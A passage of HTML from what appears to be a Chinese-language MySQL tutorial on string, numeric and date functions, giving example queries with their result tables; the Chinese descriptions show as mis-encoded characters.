UCASE(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UCASE(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>11.LEFT(s,n)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEFT(&#39;MySQL&#39;,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| LEFT(&#39;MySQL&#39;,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| My              |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>12.RIGHT(s,n)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RIGHT(&#39;MySQL&#39;,3);</span><br><span class="line">+------------------+</span><br><span class="line">| RIGHT(&#39;MySQL&#39;,3) |</span><br><span class="line">+------------------+</span><br><span class="line">| SQL              |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>13.LPAD(s1,len,s2)</strong></p><p>åœ¨å­—ç¬¦ä¸² s1 çš„å¼€å§‹å¤„å¡«å……å­—ç¬¦ä¸² s2ï¼Œä½¿å­—ç¬¦ä¸²é•¿åº¦è¾¾åˆ° len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LPAD(&#39;SQL&#39;,7,&#39;My&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| LPAD(&#39;SQL&#39;,7,&#39;My&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| MyMySQL            |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>14.RPAD(s1,len,s2)</strong></p><p>åœ¨å­—ç¬¦ä¸² s1 çš„ç»“å°¾å¤„æ·»åŠ å­—ç¬¦ä¸² s2ï¼Œä½¿å­—ç¬¦ä¸²çš„é•¿åº¦è¾¾åˆ° len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RPAD (&#39;My&#39;,8,&#39;SQL&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| RPAD (&#39;My&#39;,8,&#39;SQL&#39;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQLSQL            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LTRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s å¼€å§‹å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LTRIM(&#39;      MySQL&#39;) AS LeftTrimmedString;</span><br><span class="line">+-------------------+</span><br><span class="line">| LeftTrimmedString |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQL             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>16.RTRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s ç»“å°¾å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RTRIM (&#39;MySQL      &#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RTRIM (&#39;MySQL      &#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| MySQL                 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>17.TRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s å¼€å§‹å’Œç»“å°¾å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRIM(&#39;    MySQL    &#39;) AS TrimmedString;</span><br><span class="line">+---------------+</span><br><span class="line">| TrimmedString |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>18.MID(s,n,len)|SUBSTR(s, n, len)|SUBSTRING(s, n, len)</strong></p><p>ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(&#39;MySQL&#39;,3,3) AS ExtractString;</span><br><span class="line">+---------------+</span><br><span class="line">| ExtractString |</span><br><span class="line">+---------------+</span><br><span class="line">| SQL           |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>19.REPEAT(s,n)</strong></p><p>å°†å­—ç¬¦ä¸² s é‡å¤ n æ¬¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPEAT(&#39;MySQL&#39;,3);</span><br><span class="line">+-------------------+</span><br><span class="line">| REPEAT(&#39;MySQL&#39;,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQLMySQLMySQL   |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>20.REPLACE(s,s1,s2)</strong></p><p>å°†å­—ç¬¦ä¸² s2 æ›¿ä»£å­—ç¬¦ä¸² s ä¸­çš„å­—ç¬¦ä¸² s1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| YourSQL                       |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.REVERSE(s)</strong></p><p>å°†å­—ç¬¦ä¸²sçš„é¡ºåºåè¿‡æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REVERSE (&#39;MySQL&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| REVERSE (&#39;MySQL&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| LQSyM             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>22.SPACE (s)</strong></p><p>è¿”å›nä¸ªç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SPACE (10);</span><br><span class="line">+------------+</span><br><span class="line">| SPACE (10) |</span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>23.STRCMP(s1,s2)</strong></p><p>æ¯”è¾ƒå­—ç¬¦ä¸² s1 å’Œ s2ï¼Œå¦‚æœ s1 ä¸ s2 ç›¸ç­‰è¿”å› 0 ï¼Œå¦‚æœ s1&gt;s2 è¿”å› 1ï¼Œå¦‚æœ s1&lt;s2 è¿”å› -1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>24.SUBSTRING_INDEX(s, delimiter, number)</strong></p><p>è¿”å›ä»å­—ç¬¦ä¸² s çš„ç¬¬ number ä¸ªå‡ºç°çš„åˆ†éš”ç¬¦ delimiter ä¹‹åçš„å­ä¸²ã€‚<br>å¦‚æœ number æ˜¯æ­£æ•°ï¼Œè¿”å›ç¬¬ number ä¸ªå­—ç¬¦å·¦è¾¹çš„å­—ç¬¦ä¸²ã€‚<br>å¦‚æœ number æ˜¯è´Ÿæ•°ï¼Œè¿”å›ç¬¬(number çš„ç»å¯¹å€¼(ä»å³è¾¹æ•°))ä¸ªå­—ç¬¦å³è¾¹çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| M*y                                |</span><br><span class="line">+------------------------------------+</span><br><span class="line"> SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| S*Q*L                               |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2);</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| S*Q                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-æ•°å­—å‡½æ•°"><a href="#MySQL-æ•°å­—å‡½æ•°" class="headerlink" title="MySQL æ•°å­—å‡½æ•°"></a>MySQL æ•°å­—å‡½æ•°</h2><p><strong>1.ABS(x)</strong></p><p> è¿”å› x çš„ç»å¯¹å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ABS(-1);</span><br><span class="line">+---------+</span><br><span class="line">| ABS(-1) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.AVG(expression)</strong></p><p>è¿”å›ä¸€ä¸ªè¡¨è¾¾å¼çš„å¹³å‡å€¼ï¼Œexpression æ˜¯ä¸€ä¸ªå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(Price) AS AveragePrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| AveragePrice |</span><br><span class="line">+--------------+</span><br><span class="line">|     456.0000 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>3.ä¸‰è§’å‡½æ•°(å‚æ•°xæ˜¯å¼§åº¦)</strong></p><p>SIN(x) | COS(x) | TAN(x) | COT(x) | ASIN(x) | ACOS(x) | ATAN(x) </p><p><strong>4.DEGREES(x)</strong></p><p>å°†å¼§åº¦è½¬æ¢ä¸ºè§’åº¦ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEGREES(3.1415926535898) ;</span><br><span class="line">+--------------------------+</span><br><span class="line">| DEGREES(3.1415926535898) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|        180.0000000000004 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.CEIL(x)</strong></p><p>è¿”å›å¤§äºæˆ–ç­‰äº x çš„æœ€å°æ•´æ•°ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CEIL (0.1);</span><br><span class="line">+------------+</span><br><span class="line">| CEIL (0.1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>6.FLOOR(x)</strong></p><p>è¿”å›å°äºæˆ–ç­‰äº x çš„æœ€å¤§æ•´æ•°ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FLOOR(-0.1);</span><br><span class="line">+-------------+</span><br><span class="line">| FLOOR(-0.1) |</span><br><span class="line">+-------------+</span><br><span class="line">|          -1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>7.COUNT(expression)</strong></p><p>è¿”å›æŸ¥è¯¢çš„è®°å½•æ€»æ•°ï¼Œexpression å‚æ•°æ˜¯ä¸€ä¸ªå­—æ®µæˆ–è€… * å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(User) AS User_number FROM user;</span><br><span class="line">+-------------+</span><br><span class="line">| User_number |</span><br><span class="line">+-------------+</span><br><span class="line">|           6 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>8.n DIV m</strong></p><p>æ•´é™¤ï¼Œn ä¸ºè¢«é™¤æ•°ï¼Œm ä¸ºé™¤æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 10 DIV 5;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 5 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>9.MOD(x,y)</strong></p><p>è¿”å› x é™¤ä»¥ y ä»¥åçš„ä½™æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MOD(5,2);</span><br><span class="line">+----------+</span><br><span class="line">| MOD(5,2) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>10.EXP(x)</strong></p><p>è¿”å› e çš„ x æ¬¡æ–¹ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(3) ;</span><br><span class="line">+--------------------+</span><br><span class="line">| EXP(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>11.GREATEST(expr1, expr2, expr3, â€¦)</strong></p><p>è¿”å›åˆ—è¡¨ä¸­çš„æœ€å¤§å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT GREATEST(3, 12, 34, 8, 25);</span><br><span class="line">+----------------------------+</span><br><span class="line">| GREATEST(3, 12, 34, 8, 25) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         34 |</span><br><span class="line">+----------------------------+</span><br><span class="line">SELECT GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Oracle                               |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.LEAST(expr1, expr2, expr3, â€¦)</strong></p><p>è¿”å›åˆ—è¡¨ä¸­çš„æœ€å°å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEAST(3, 12, 34, 8, 25);</span><br><span class="line">+-------------------------+</span><br><span class="line">| LEAST(3, 12, 34, 8, 25) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       3 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.MAX(expression)</strong></p><p>è¿”å›å­—æ®µ expression ä¸­çš„æœ€å¤§å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(Price) AS LargestPrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| LargestPrice |</span><br><span class="line">+--------------+</span><br><span class="line">|          789 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.MIN(expression)</strong></p><p>è¿”å›å­—æ®µ expression ä¸­çš„æœ€å°å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MIN(Price) AS MinPrice FROM Products;</span><br><span class="line">+----------+</span><br><span class="line">| MinPrice |</span><br><span class="line">+----------+</span><br><span class="line">|      123 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>15.å¯¹æ•°è®¡ç®—</strong></p><p>LOG(x)  è¿”å›æ•°å­—çš„è‡ªç„¶å¯¹æ•°ï¼Œä»¥ e ä¸ºåº•ã€‚</p><p>LOG(n, x)  è¿”å›ä»¥nä¸ºåº•ï¼Œæ•°å­—xçš„å¯¹æ•°ã€‚</p><p>LOG2(x)  è¿”å›ä»¥ 2 ä¸ºåº•çš„å¯¹æ•°ã€‚</p><p>LOG10(x)   è¿”å›ä»¥ 10 ä¸ºåº•çš„å¯¹æ•°ã€‚</p><p><strong>16.PI()</strong></p><p>è¿”å›åœ†å‘¨ç‡(3.141593ï¼‰</p><p><strong>17.POW(x,y)  | POWER(x,y)</strong></p><p>è¿”å› x çš„ y æ¬¡æ–¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT POW (2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| POW (2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line">SELECT POWER(2,3);</span><br><span class="line">+------------+</span><br><span class="line">| POWER(2,3) |</span><br><span class="line">+------------+</span><br><span class="line">|          8 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>18.RADIANS(x)</strong></p><p>å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RADIANS(180);</span><br><span class="line">+-------------------+</span><br><span class="line">| RADIANS(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>19.RAND()</strong></p><p>è¿”å› 0 åˆ° 1 çš„éšæœºæ•°ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RAND();</span><br><span class="line">+--------------------+</span><br><span class="line">| RAND()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.8029554586885083 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>20.ROUND(x)</strong></p><p>è¿”å›ç¦» x æœ€è¿‘çš„æ•´æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ROUND(1.49999999999);</span><br><span class="line">+----------------------+</span><br><span class="line">| ROUND(1.49999999999) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT ROUND(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| ROUND(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>21.SIGN(x)</strong></p><p>è¿”å› x çš„ç¬¦å·ï¼Œx æ˜¯è´Ÿæ•°ã€0ã€æ­£æ•°åˆ†åˆ«è¿”å› -1ã€0 å’Œ 1ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SIGN(-1);</span><br><span class="line">+----------+</span><br><span class="line">| SIGN(-1) |</span><br><span class="line">+----------+</span><br><span class="line">|       -1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>22.SQRT(x)</strong></p><p>è¿”å›xçš„å¹³æ–¹æ ¹ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SQRT(4);</span><br><span class="line">+---------+</span><br><span class="line">| SQRT(4) |</span><br><span class="line">+---------+</span><br><span class="line">|       2 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>23.SUM(expression)</strong></p><p>è¿”å›æŒ‡å®šå­—æ®µçš„æ€»å’Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(Price) FROM Products;</span><br><span class="line">+------------+</span><br><span class="line">| SUM(Price) |</span><br><span class="line">+------------+</span><br><span class="line">|       1368 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>24.TRUNCATE(x,y)</strong></p><p>è¿”å›æ•°å€¼ x ä¿ç•™åˆ°å°æ•°ç‚¹å y ä½çš„å€¼ï¼ˆä¸ ROUND æœ€å¤§çš„åŒºåˆ«æ˜¯ä¸ä¼šè¿›è¡Œå››èˆäº”å…¥ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRUNCATE(1.23456,3);</span><br><span class="line">+---------------------+</span><br><span class="line">| TRUNCATE(1.23456,3) |</span><br><span class="line">+---------------------+</span><br><span class="line">|               1.234 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-æ—¥æœŸå‡½æ•°"><a href="#MySQL-æ—¥æœŸå‡½æ•°" class="headerlink" title="MySQL æ—¥æœŸå‡½æ•°"></a>MySQL æ—¥æœŸå‡½æ•°</h2><p><strong>1.ADDDATE(d,n)</strong></p><p> è®¡ç®—èµ·å§‹æ—¥æœŸ d åŠ ä¸Š n å¤©çš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDDATE(&#39;2020-2-1&#39;,30);</span><br><span class="line">+------------------------+</span><br><span class="line">| ADDDATE(&#39;2020-2-1&#39;,30) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 2020-03-02             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>2.ADDTIME(t,n)</strong></p><p>n æ˜¯ä¸€ä¸ªæ—¶é—´è¡¨è¾¾å¼ï¼Œæ—¶é—´ t åŠ ä¸Šæ—¶é—´è¡¨è¾¾å¼ n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020-11-11 00:00:00                    |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.DATE_ADD(dï¼ŒINTERVAL expr type)</strong></p><p>è®¡ç®—èµ·å§‹æ—¥æœŸ d åŠ ä¸Šä¸€ä¸ªæ—¶é—´æ®µåçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE) |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| 2020-11-11 11:16:11                                |</span><br><span class="line">+----------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.å½“å‰æ—¥æœŸæ—¶é—´</strong></p><p>CURDATE()  |   CURRENT_DATE()   è¿”å›å½“å‰æ—¥æœŸ</p><p>CURTIME()  |    CURRENT_TIME     è¿”å›å½“å‰æ—¶é—´</p><p>NOW()  |  CURRENT_TIMESTAMP()  |  LOCALTIME()  |LOCALTIMESTAMP()   |  SYSDATE()  è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´</p><p><strong>5.DATE(t)  |  HOUR(t)  |  